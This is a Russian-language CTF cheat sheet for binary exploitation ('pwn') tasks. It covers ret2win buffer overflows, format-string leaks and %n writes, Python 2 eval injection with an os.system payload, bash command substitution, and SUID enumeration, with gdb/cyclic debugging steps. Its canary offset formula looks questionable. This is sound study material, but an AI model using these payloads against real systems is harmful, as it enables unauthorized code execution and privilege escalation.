# PWN: типовые уязвимости и порядок действий

## Что чаще всего встречается в простых задачах

| Уязвимость | Признак | Что делать |
|---|---|---|
| Переполнение буфера + win-функция | `strcpy`/`gets`/`scanf("%s")`, рядом функция с флагом | оффсет + адрес, ret2win |
| `eval` в Python 2 | `input()` вместо `raw_input()` | `__import__('os').system('cat flag')` |
| Инъекция в bash | `read -p`, подстановка `$()` | команда в поле ввода |
| Format string | `printf(user_input)`, `%p` | утечки `%p`, запись `%n` (если не фильтруется) |
| SUID-бинарь | `find / -perm -4000` | GTFObins или разбор логики |

## Порядок

1. `checksec` / `file`: архитектура, PIE, canary, NX.
2. `objdump -d ./bin | grep -A40 '<main>'` или Ghidra: найти небезопасный ввод и win-функцию.
3. Оффсет: `python ret2win.py pattern 200`, отправить, взять значение из падения,
   `python ret2win.py offset 0x6161616b` (или в gdb `cyclic -l`).
4. Адрес win-функции: `objdump -d ./bin | grep -A5 '<win>'` или `nm ./bin | grep win`.
5. Payload: `python ret2win.py payload --offset 80 --addr 0x4011a2`.
6. Если падает по стеку — добавить `--align` (лишний `ret`).
7. Отправить: `--remote host:port` или вручную через nc.

## Оффсет с канарейкой

`offset = размер_буфера + 8 (canary) + 4 (padding) + 4 (EBP)`.
Например: 64 + 8 + 4 + 4 = 80.

## Если это не переполнение

- Format string: `%p` для утечек, `%n` может быть запрещён (фильтр) — тогда переполнение.
- Python: `input()` в py2 = eval → `__import__('os').system('cat flag')`.
- Bash: `read -p "$x"` → подстановка команд.
- SUID: `sudo -l`, GTFObins, `find / -perm -4000 -type f 2>/dev/null`.

## Отладка

```bash
gdb ./bin
cyclic 200
run < <(python -c "print('A'*200)")
cyclic -l 0x6161616b
x/20gx $rsp
```
